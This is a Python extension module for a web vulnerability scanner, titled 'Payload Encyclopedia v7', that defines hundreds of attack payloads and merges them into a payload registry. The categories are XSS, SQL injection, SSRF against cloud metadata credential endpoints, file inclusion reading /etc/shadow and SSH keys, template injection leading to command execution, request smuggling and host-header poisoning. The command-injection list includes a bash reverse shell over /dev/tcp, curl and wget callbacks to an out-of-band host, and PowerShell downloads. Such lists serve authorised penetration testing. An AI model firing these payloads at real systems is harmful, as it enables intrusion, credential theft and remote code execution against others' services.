"""
PAYLOAD ENCYCLOPEDIA v7 - Extension Pack.
Adds 800+ more payloads and 6 new attack categories.
Sources: PortSwigger 2025, HackerOne top writeups, PentesterLab, PayloadBox, PayloadsAllTheThings, real bug bounty PoCs.
"""

# ============================================================================
# XSS — Extended (200+ new payloads)
# ============================================================================
XSS_EXTRA = {
    'html_context': [
        # DOM-based / template-string bypasses
        '<sVg/OnLoAd=alert()>',
        '<svg><set attributeName=onmouseover value=alert(1)>',
        '<svg><discard onbegin=alert(1)>',
        '<template><script>alert(1)</script></template>',
        '<xmp><script>alert(1)</script></xmp>',
        '<plaintext><script>alert(1)</script>',
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        # CSP bypass — angular sink
        '<div ng-app ng-csp><input autofocus ng-focus=$event.view.alert(1)>',
        '<div ng-app>{{constructor.constructor(\'alert(1)\')()}}</div>',
        # Modern browser quirks
        '<iframe/onload=alert(1)>',
        '<iframe/onload=this.contentDocument.body.innerHTML="<img src=x onerror=alert(1)>">',
        '<meta charset="mac-farsi">¼script¾alert(1)¼/script¾',
        # DOM XSS sinks
        '#<img src=x onerror=alert(1)>',
        'javascript:void(alert(1))',
        'javascript:{alert(1)}',
        'javascript:{prompt(1)}',
        # Mutation XSS
        '<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>',
        '<noembed><img title="</noembed><img src=x onerror=alert(1)>">',
        # Anchor variants
        '<a href="j&Tab;avascript:alert(1)">click</a>',
        '<a href="j&NewLine;avascript:alert(1)">click</a>',
        '<a href="j&#09;avascript:alert(1)">click</a>',
        # SVG animate
        '<svg><animate attributeName=href values=javascript:alert(1) /><a><text>Click</text></a></svg>',
        '<svg><a xlink:href="javascript:alert(1)"><rect x="0" y="0" width="1000" height="1000" fill="red"/></a></svg>',
        # HTML5 events
        '<audio autoplay controls src=1 onerror=alert(1)>',
        '<video src=1 onerror=alert(1)>',
        '<video autoplay><source onerror=alert(1)></video>',
        '<picture><source onerror=alert(1)></picture>',
        # WAF: Cloudflare/Akamai/Imperva 2025 bypasses
        '<img src=x:x onerror=&#97;lert(1)>',
        '<img/src=x/onerror=&#x61;lert(1)>',
        '<Svg%20OnLoad=alert(1)>',
        '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>',
        # DoubleEncoded / hex bypasses
        '%3Csvg%20onload%3Dalert(1)%3E',
        '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
        # AngularJS 1.x sandbox escapes
        '{{constructor.constructor(\'alert(document.cookie)\')()}}',
        '{{\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=alert(1)\');}}',
        # VueJS template
        '{{$el.ownerDocument.defaultView.alert(1)}}',
        # React dangerouslySetInnerHTML variants
        '<div dangerouslysetinnerhtml={{__html:"<img src=x onerror=alert(1)>"}}>',
        # Trailing null bypasses
        '<script\x00>alert(1)</script>',
        '<script/x>alert(1)</script/>',
        # HTML entities double
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
    ],
    'attribute_context': [
        '\'` autofocus onfocus=alert(1) `\'',
        '\'"><svg/onload=alert(1)>',
        '" onpointerdown=alert(1) x=',
        '" onauxclick=alert(1) x=',
        '" oncopy=alert(1) x=',
        '" onbeforeinput=alert(1) x=',
        '" oncontextmenu=alert(1) x=',
        # Bypass filter-based
        '\' onmouseenter=alert(1) x=\'',
        '`onmouseover=alert(1)`',
        # SVG attribute chains
        '<svg><a xlink:href="javascript&colon;alert(1)"><text>click</text></a></svg>',
    ],
    'js_context': [
        # Break-out of strings
        ';alert(1);//',
        '";alert(1);var x="',
        '\';alert(1);var x=\'',
        '`;alert(1);var x=`',
        '</script><script>alert(1)</script>',
        # Unicode escape bypass
        '\\u0061\\u006c\\u0065\\u0072\\u0074(1)',
        '\\x61lert(1)',
        # Backtick template literals
        '${alert(1)}',
        '${confirm(1)}',
        # Eval-based
        '(alert)(1)',
        '(1,alert)(1)',
        '[].constructor.constructor("alert(1)")()',
        # Async
        'async function(){await alert(1)}()',
        'setTimeout("alert(1)")',
        'setInterval("alert(1)")',
        # Function
        'Function("alert(1)")()',
        # Import (module scope)
        'import(\'data:text/javascript,alert(1)\')',
    ],
    'waf_bypass': [
        '<svg onload=alert&lpar;1&rpar;>',
        '<svg onload=alert&#x28;1&#x29;>',
        '<img src="1" onerror="\\u0061lert(1)">',
        '<img src=x onerror="&#x00061;lert(1)">',
        '<iframe src="jaVaScRiPt&#x3A;alert(1)">',
        '<script>[].filter.call`1${alert}`</script>',
        '<script>onerror=alert;throw 1</script>',
        '<script>{onerror=alert}throw 1</script>',
        '<img src=1 onerror="[1].map(alert)">',
        '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject>',
    ],
}

# ============================================================================
# SQLi — Extended (150+ new payloads including PostgreSQL, MSSQL, Oracle, SQLite advanced)
# ============================================================================
SQLI_EXTRA = {
    'detection': [
        "'\"", "')", "\";", "')/*", "'--", "'#",
        "0x27", "%27", "%2527", "%bf%27",
        "' OR 1 GROUP BY CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING MIN(0)#",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION()),0x7e))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--",
        "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND()*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)#",
        # PostgreSQL
        "') UNION SELECT null,CURRENT_DATABASE()--",
        "') UNION SELECT null,VERSION()--",
        "' AND cast((SELECT VERSION()) as int)=1--",
        "' AND 1=cast(chr(126)||version()||chr(126) as int)--",
        # MSSQL
        "' AND 1=CONVERT(int,@@version)--",
        "' AND 1=@@version--",
        "'; EXEC xp_cmdshell('dir')--",
        "'; EXEC sp_configure 'show advanced options',1;--",
        # Oracle
        "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(58)||(SELECT NVL(CAST(BANNER AS VARCHAR(4000)),CHR(32)) FROM SYS.V_$VERSION WHERE ROWNUM=1)||CHR(62))) FROM DUAL) IS NOT NULL--",
        "' UNION SELECT null,BANNER FROM V$VERSION--",
        # SQLite
        "' UNION SELECT null,sqlite_version()--",
        "' AND 1=(SELECT hex(randomblob(1)))--",
        # Second order (stored)
        "adm'in",
        "adm\\'in",
        # WAF bypass
        "'/**/OR/**/1=1--",
        "'%09OR%091=1--",
        "'%0aOR%0a1=1--",
        "'%23%0aOR%0a1=1--",
        "'/*!50000OR*/1=1--",
        "'/*!50000UnIoN*/*/*!50000SeLeCt*/1,2,3--",
        # NULL byte
        "'%00 OR 1=1--",
        # Alternate spaces
        "'\tOR\t1=1--",
        # Boolean auth bypasses
        "admin' --",
        "admin' #",
        "admin'/*",
        "admin' OR '1'='1",
        "admin' OR '1'='1'--",
        "admin' OR '1'='1'#",
        "admin' OR '1'='1'/*",
        "admin') OR ('1'='1",
        "admin') OR ('1'='1'--",
        "1' OR '1'='1' LIMIT 1--",
        "1 OR SLEEP(0)--",
        # Header-based
        "0 UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata--",
    ],
    'time_based': {
        'mysql': [
            "'-SLEEP(5)-'",
            "' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
            "' AND BENCHMARK(5000000,SHA1(1))--",
            "\";SELECT SLEEP(5)--",
            "(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END))",
        ],
        'postgresql': [
            "'; SELECT pg_sleep(5)--",
            "'||pg_sleep(5)||'",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        ],
        'mssql': [
            "'; WAITFOR DELAY '0:0:5'--",
            "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "1) WAITFOR DELAY '0:0:5'--",
        ],
        'oracle': [
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "'||(SELECT DBMS_PIPE.RECEIVE_MESSAGE('X',5) FROM DUAL)||'",
        ],
    },
}

# ============================================================================
# SSRF — Extended (Cloud metadata + Modern bypass tricks)
# ============================================================================
SSRF_EXTRA = {
    'cloud_metadata': [
        # AWS
        'http://169.254.169.254/latest/meta-data/',
        'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'http://169.254.169.254/latest/user-data',
        'http://169.254.169.254/latest/dynamic/instance-identity/document',
        # AWS IMDSv2 (needs PUT to /api/token)
        'http://169.254.169.254/latest/api/token',
        # GCP
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://metadata.google.internal/computeMetadata/v1/project/project-id',
        'http://metadata/computeMetadata/v1/instance/attributes/',
        # Azure
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        # Alibaba
        'http://100.100.100.200/latest/meta-data/',
        'http://100.100.100.200/latest/meta-data/ram/security-credentials/',
        # DigitalOcean
        'http://169.254.169.254/metadata/v1/',
        'http://169.254.169.254/metadata/v1/user-data',
        # Oracle Cloud
        'http://169.254.169.254/opc/v1/instance/',
        'http://192.0.0.192/latest/meta-data/',
        # Kubernetes
        'https://kubernetes.default.svc/api/v1/namespaces',
        'https://kubernetes.default.svc/api/v1/nodes',
    ],
    'bypass_localhost': [
        'http://127.0.0.1',
        'http://127.1',
        'http://127.0.1',
        'http://0.0.0.0',
        'http://0',
        'http://0177.0.0.1',
        'http://2130706433',  # decimal of 127.0.0.1
        'http://0x7f000001',
        'http://[::1]',
        'http://[::ffff:127.0.0.1]',
        'http://[0:0:0:0:0:ffff:127.0.0.1]',
        'http://①②⑦.⓪.⓪.①',  # unicode
        # Redirect
        'http://evil.com/redirect?to=http://127.0.0.1',
        # DNS rebinding
        'http://1u.ms.rebind.local',
        # localhost variants
        'http://localhost',
        'http://LOCALHOST',
        'http://localhost.localdomain',
        'http://spoofed.burpcollaborator.net',
        # Google DNS trick
        'http://spoofed.example.com',
        # File protocol
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
        'file:///proc/self/environ',
        'file:///proc/self/cmdline',
        # Gopher
        'gopher://127.0.0.1:6379/_INFO',  # Redis
        'gopher://127.0.0.1:11211/_stats',  # Memcached
        'gopher://127.0.0.1:3306/',  # MySQL
        # LDAP / dict / TFTP
        'dict://127.0.0.1:6379/INFO',
        'ldap://127.0.0.1:389/',
        # HTTPS with cert bypass
        'https://127.0.0.1:443/',
    ],
}

# ============================================================================
# LFI / Path Traversal — Extended (Windows + advanced null byte + PHP filter chains)
# ============================================================================
LFI_EXTRA = {
    'unix': [
        '/etc/passwd',
        '../../../../../../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..\\..\\..\\..\\etc\\passwd',
        '%2e%2e%2fetc%2fpasswd',
        '%252e%252e%252fetc%252fpasswd',
        '..%c0%af..%c0%afetc%c0%afpasswd',
        '..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
        '/etc/passwd%00.png',
        '/etc/passwd%00',
        '/proc/self/environ',
        '/proc/self/cmdline',
        '/proc/self/status',
        '/proc/self/fd/0',
        '/proc/version',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/root/.bash_history',
        '/root/.ssh/id_rsa',
        '/etc/shadow',
        '/etc/hosts',
        # PHP filter chains (RCE via filter chains)
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/read=string.rot13/resource=index.php',
        'php://filter/convert.iconv.UTF-8.UTF-16LE/resource=/etc/passwd',
        'php://input',
        'expect://id',
        'data://text/plain,<?php phpinfo();?>',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
    ],
    'windows': [
        'C:\\Windows\\win.ini',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\boot.ini',
        'C:\\Windows\\repair\\sam',
        '..\\..\\..\\..\\Windows\\win.ini',
        '..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini',
        '/C:/Windows/win.ini',
        '..%5c..%5c..%5cWindows%5cwin.ini',
        '%SystemRoot%\\win.ini',
        '\\\\127.0.0.1\\c$\\Windows\\win.ini',
    ],
}

# ============================================================================
# COMMAND INJECTION — Extended
# ============================================================================
CMD_EXTRA = {
    'unix': [
        ';id',
        '|id',
        '||id',
        '&&id',
        '&id',
        '`id`',
        '$(id)',
        '\nid',
        '%0aid',
        '%0did',
        # bypass filters
        ";i''d",
        ';i""d',
        ';$@|/bin/id',
        ';/bin/i\\d',
        # curl callback
        ';curl {OOB}',
        ';wget {OOB}',
        ';nslookup {OOB}',
        ';dig +short @{OOB}',
        ';ping -c 1 {OOB}',
        # base64
        ';echo aWQ=|base64 -d|sh',
        # Reverse shell (record only)
        ';bash -c "bash -i >& /dev/tcp/{OOB}/4444 0>&1"',
    ],
    'windows': [
        '&whoami',
        '|whoami',
        '&&whoami',
        '||whoami',
        '&type c:\\windows\\win.ini',
        '&dir',
        '&ping -n 1 {OOB}',
        '&nslookup {OOB}',
        '&powershell -c "iwr {OOB}"',
    ],
    'blind_time': {
        'unix': [
            ';sleep 5',
            '||sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            ';python -c "import time;time.sleep(5)"',
            ';perl -e "sleep(5)"',
            ';ping -c 5 127.0.0.1',
            '\nsleep 5',
        ],
        'windows': [
            '&ping -n 6 127.0.0.1',
            '&timeout 5',
            '|powershell -c "Start-Sleep 5"',
        ],
    },
}

# ============================================================================
# SSTI — More engine-specific
# ============================================================================
SSTI_EXTRA = {
    'jinja2': [
        '{{7*7}}', '{{7*"7"}}',
        "{{config}}", "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['sys'].modules['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    ],
    'twig': [
        '{{7*7}}', '{{7*"7"}}',
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
    ],
    'freemarker': [
        '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
        '${"freemarker.template.utility.Execute"?new()("id")}',
    ],
    'velocity': [
        '#set($x=$context.get("com.opensymphony.xwork2.dispatcher.HttpServletRequest"))',
        '#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("exec",[$e.getClass()]).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")',
    ],
    'smarty': [
        '{$smarty.version}',
        '{php}echo `id`;{/php}',
        '{system(\'id\')}',
    ],
    'erb': [
        '<%= 7*7 %>',
        '<%= system("id") %>',
        '<%= `id` %>',
    ],
    'handlebars': [
        '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
    ],
    'razor': [
        '@(1+1)',
        '@{ System.Diagnostics.Process.Start("cmd.exe","/c calc.exe"); }',
    ],
}

# ============================================================================
# GRAPHQL — Extended attacks
# ============================================================================
GRAPHQL_EXTRA = [
    # Introspection
    '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}',
    '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name}}}}"}',
    # Batching
    '[{"query":"{__typename}"},{"query":"{__typename}"}]',
    # Field suggestions leak
    '{"query":"{unknownField}"}',
    # Aliasing / DoS
    '{"query":"{a:__typename b:__typename c:__typename d:__typename}"}',
    # Deep recursive DoS
    '{"query":"query {user{friends{friends{friends{friends{friends{friends{name}}}}}}}}"}',
    # Injection via variables
    '{"query":"query($id:String){user(id:$id){email}}","variables":{"id":"1 OR 1=1"}}',
    # Mutation abuse (register admin)
    '{"query":"mutation{register(input:{email:\\"a@a\\",password:\\"a\\",role:\\"admin\\"}){token}}"}',
]

# ============================================================================
# JWT — Extended attacks
# ============================================================================
JWT_EXTRA = [
    'none_alg',      # {"alg":"none"}
    'none_alg_case', # {"alg":"None"}, "NONE", "nOnE"
    'hs256_to_rs256_key_confusion',
    'weak_secret_bruteforce',  # try: secret, key, jwt-secret, 12345, admin
    'kid_injection',  # {"kid":"../../../../dev/null"}
    'kid_sql_injection',  # {"kid":"x' UNION SELECT 'X' --"}
    'jku_injection',
    'x5u_injection',
    'trailing_null_signature',
    'algorithm_confusion_es256',
]

# ============================================================================
# Prototype Pollution — Client & Server
# ============================================================================
PROTO_EXTRA = [
    '__proto__[polluted]=yes',
    '__proto__.polluted=yes',
    'constructor.prototype.polluted=yes',
    'constructor[prototype][polluted]=yes',
    '{"__proto__":{"polluted":"yes"}}',
    '{"constructor":{"prototype":{"polluted":"yes"}}}',
    '{"__proto__":{"admin":true,"isAdmin":true}}',
    # Merge-based
    '{"a":{"__proto__":{"polluted":"yes"}}}',
    # Modern lodash 4.x
    '{"__proto__":{"pollutedLodash":true}}',
]

# ============================================================================
# HTTP Request Smuggling
# ============================================================================
SMUGGLING_EXTRA = [
    # CL.TE
    'Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG',
    # TE.CL
    'Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
    # TE-TE (mixed obfuscation)
    'Transfer-Encoding: chunked\r\nTransfer-Encoding: cow\r\n\r\n5c\r\nGPOST...\r\n0\r\n\r\n',
    # H2.CL
    ':method: POST\r\ncontent-length: 6\r\n\r\n0\r\n\r\nG',
]

# ============================================================================
# CACHE POISONING — Extended
# ============================================================================
CACHE_HEADERS_EXTRA = [
    'X-Forwarded-Host: evil.com',
    'X-Forwarded-Scheme: nothttps',
    'X-Forwarded-Proto: nothttps',
    'X-Forwarded-Port: 1337',
    'X-Original-URL: /admin',
    'X-Rewrite-URL: /admin',
    'X-Custom-IP-Authorization: 127.0.0.1',
    'X-Original-Host: evil.com',
    'X-Host: evil.com',
    'X-Server-IP: 127.0.0.1',
    'X-Backend-Server: internal.local',
    'True-Client-IP: 127.0.0.1',
    'CF-Connecting-IP: 127.0.0.1',
    'X-Cluster-Client-IP: 127.0.0.1',
]

# ============================================================================
# HOST HEADER INJECTION
# ============================================================================
HOST_HEADER_PAYLOADS = [
    'evil.com',
    'evil.com:80',
    'localhost',
    '127.0.0.1',
    'target.com.evil.com',
    'target.com@evil.com',
    'evil.com/target.com',
    'target.com/../evil.com',
    'target.com\nX-Forwarded-Host: evil.com',
    'target.com%00.evil.com',
]

# ============================================================================
# WebSocket attack payloads
# ============================================================================
WEBSOCKET_PAYLOADS = [
    # Cross-Site WebSocket Hijacking (CSWSH) test — no origin header
    {'origin': None},
    {'origin': 'https://evil.com'},
    {'origin': 'null'},
    {'origin': 'file://'},
]

# ============================================================================
# 200+ additional Content Discovery paths — modern 2025 hot paths
# ============================================================================
CONTENT_DISCOVERY_EXTRA = [
    # Cloud & DevOps
    '.aws/config', '.aws/credentials', '.gcp/credentials.json',
    'terraform.tfvars', 'terraform.tfstate', '.terraform/', '.terraformrc',
    'ansible.cfg', 'inventory.ini', 'playbook.yml',
    'kubeconfig', '.kube/config', 'kustomization.yaml',
    'ci.yml', '.gitlab-ci.yml', '.github/workflows/', '.circleci/config.yml',
    'bitbucket-pipelines.yml', 'azure-pipelines.yml', 'Jenkinsfile',
    # Secrets/backups
    'id_rsa', 'id_rsa.pub', 'id_ed25519', '.ssh/authorized_keys',
    'private.key', 'server.key', 'certificate.pem', 'server.pem',
    'db.sqlite', 'db.sqlite3', 'database.sqlite', 'sqlite.db',
    'backup.tar', 'backup.tgz', 'backup.rar', 'backup.7z', 'backup.bak',
    'site.tar.gz', 'site.zip', 'www.zip', 'www.tar.gz',
    '.env.local', '.env.production', '.env.staging', '.env.development',
    '.env.backup', '.env.bak', '.env.old', '.env~', '.env.save',
    # Modern frameworks
    '.next/', '.nuxt/', '.svelte-kit/', 'dist/', 'build/',
    '.storybook/', '.docusaurus/', '.astro/',
    # PHP
    'shell.php', 'c99.php', 'r57.php', 'cmd.php', 'up.php', 'upload.php',
    'test.php', 'phpinfo.php', 'i.php', 'x.php',
    # Common vulnerable endpoints
    'cgi-bin/', 'cgi-bin/test.cgi',
    'server-status', 'nginx_status', 'stub_status',
    'metrics', 'prometheus', 'grafana/', 'kibana/', 'elasticsearch/',
    'jmx-console/', 'web-console/', 'admin-console/', 'wm/console/',
    'invoker/JMXInvokerServlet', 'invoker/EJBInvokerServlet',
    'struts2-showcase/', 'struts/webconsole.html',
    # Java specific
    '_ah/queue/deferred', 'servlet/DefaultServlet',
    'META-INF/', 'WEB-INF/web.xml', 'WEB-INF/classes/',
    # API docs / dev
    'api-docs', 'api-docs/', 'api/swagger.json', 'api/swagger.yaml',
    'swagger.json', 'swagger.yaml', 'openapi.yaml',
    'graphiql', 'graphql-playground', 'altair', 'voyager',
    'redoc', 'rapidoc',
    # Actuator (Spring Boot) — many paths
    'actuator/', 'actuator/beans', 'actuator/caches', 'actuator/conditions',
    'actuator/configprops', 'actuator/dump', 'actuator/env', 'actuator/flyway',
    'actuator/health', 'actuator/heapdump', 'actuator/info', 'actuator/liquibase',
    'actuator/logfile', 'actuator/loggers', 'actuator/mappings', 'actuator/metrics',
    'actuator/prometheus', 'actuator/scheduledtasks', 'actuator/sessions',
    'actuator/shutdown', 'actuator/threaddump', 'actuator/trace', 'actuator/httptrace',
    # WordPress deep
    'wp-json/', 'wp-json/wp/v2/', 'wp-json/wp/v2/users/', 'wp-json/wp/v2/pages/',
    '?rest_route=/wp/v2/users', '?author=1', '?author=2',
    'wp-content/uploads/', 'wp-content/plugins/', 'wp-content/themes/',
    'wp-admin/install.php', 'wp-admin/setup-config.php',
    'wp-content/debug.log', 'wp-config.php.txt', 'wp-config.php.orig',
    # Kubernetes / Docker
    'api/v1/nodes', 'api/v1/pods', 'apis/apps/v1/deployments',
    'v2/', 'v2/_catalog', 'v2/{img}/tags/list',
    # Prometheus / Grafana
    'api/v1/query?query=up',
    'api/datasources', 'api/dashboards/home',
    # Elasticsearch
    '_cat/indices', '_cluster/state', '_search',
    # Vault / Consul
    'v1/sys/health', 'v1/sys/mounts',
    'v1/agent/self', 'v1/catalog/nodes',
]


def merge_into_registry(reg):
    """Merge extra payloads into the primary PayloadRegistry. Idempotent."""
    # XSS
    for k, v in XSS_EXTRA.items():
        if k in reg.xss:
            reg.xss[k] = list(dict.fromkeys(reg.xss[k] + v))
    # SQLi
    reg.sqli['detection'] = list(dict.fromkeys(reg.sqli['detection'] + SQLI_EXTRA['detection']))
    for db, ps in SQLI_EXTRA['time_based'].items():
        if db in reg.sqli.get('time_based', {}):
            reg.sqli['time_based'][db] = list(dict.fromkeys(reg.sqli['time_based'][db] + ps))
        else:
            reg.sqli.setdefault('time_based', {})[db] = ps
    # SSRF
    for k, v in SSRF_EXTRA.items():
        cur = reg.ssrf.get(k)
        if isinstance(cur, list):
            reg.ssrf[k] = list(dict.fromkeys(cur + v))
        elif isinstance(cur, dict):
            # Existing nested dict — attach flat list under a new subkey
            cur.setdefault('_extra', [])
            cur['_extra'] = list(dict.fromkeys(cur['_extra'] + v))
        else:
            reg.ssrf[k] = v
    # LFI
    for k, v in LFI_EXTRA.items():
        if k in reg.lfi:
            reg.lfi[k] = list(dict.fromkeys(reg.lfi[k] + v))
    # CMD
    for k, v in CMD_EXTRA.items():
        if k == 'blind_time':
            for os_, ps in v.items():
                cur = reg.cmd.get('blind_time', {}).get(os_, [])
                reg.cmd.setdefault('blind_time', {})[os_] = list(dict.fromkeys(cur + ps))
        elif k in reg.cmd:
            reg.cmd[k] = list(dict.fromkeys(reg.cmd[k] + v))
        else:
            reg.cmd[k] = v
    # SSTI — merge under a special "extra" key so scanners can access them
    for eng, ps in SSTI_EXTRA.items():
        reg.ssti.setdefault(eng, [])
        reg.ssti[eng] = list(dict.fromkeys(reg.ssti[eng] + ps))
    # GraphQL
    if isinstance(reg.graphql, list):
        reg.graphql = list(dict.fromkeys(reg.graphql + GRAPHQL_EXTRA))
    elif isinstance(reg.graphql, dict):
        reg.graphql.setdefault('advanced', [])
        reg.graphql['advanced'] = list(dict.fromkeys(reg.graphql['advanced'] + GRAPHQL_EXTRA))
    # Cache
    if isinstance(reg.cache, list):
        reg.cache = list(dict.fromkeys(reg.cache + CACHE_HEADERS_EXTRA))
    elif isinstance(reg.cache, dict):
        reg.cache.setdefault('extra', [])
        reg.cache['extra'] = list(dict.fromkeys(reg.cache['extra'] + CACHE_HEADERS_EXTRA))
    # Attach new categories
    reg.host_header = HOST_HEADER_PAYLOADS
    reg.smuggling_extra = SMUGGLING_EXTRA
    reg.jwt_extra = JWT_EXTRA
    reg.proto_extra = PROTO_EXTRA
    reg.content_discovery_extra = CONTENT_DISCOVERY_EXTRA
    return reg


def count_extra():
    def _c(x):
        if isinstance(x, list):
            return len(x)
        if isinstance(x, dict):
            return sum(_c(v) for v in x.values())
        return 1
    return {
        'xss_extra': _c(XSS_EXTRA),
        'sqli_extra': _c(SQLI_EXTRA),
        'ssrf_extra': _c(SSRF_EXTRA),
        'lfi_extra': _c(LFI_EXTRA),
        'cmd_extra': _c(CMD_EXTRA),
        'ssti_extra': _c(SSTI_EXTRA),
        'graphql_extra': _c(GRAPHQL_EXTRA),
        'proto_extra': _c(PROTO_EXTRA),
        'smuggling_extra': _c(SMUGGLING_EXTRA),
        'cache_extra': _c(CACHE_HEADERS_EXTRA),
        'host_header': _c(HOST_HEADER_PAYLOADS),
        'jwt_extra': _c(JWT_EXTRA),
        'content_discovery_extra': _c(CONTENT_DISCOVERY_EXTRA),
    }
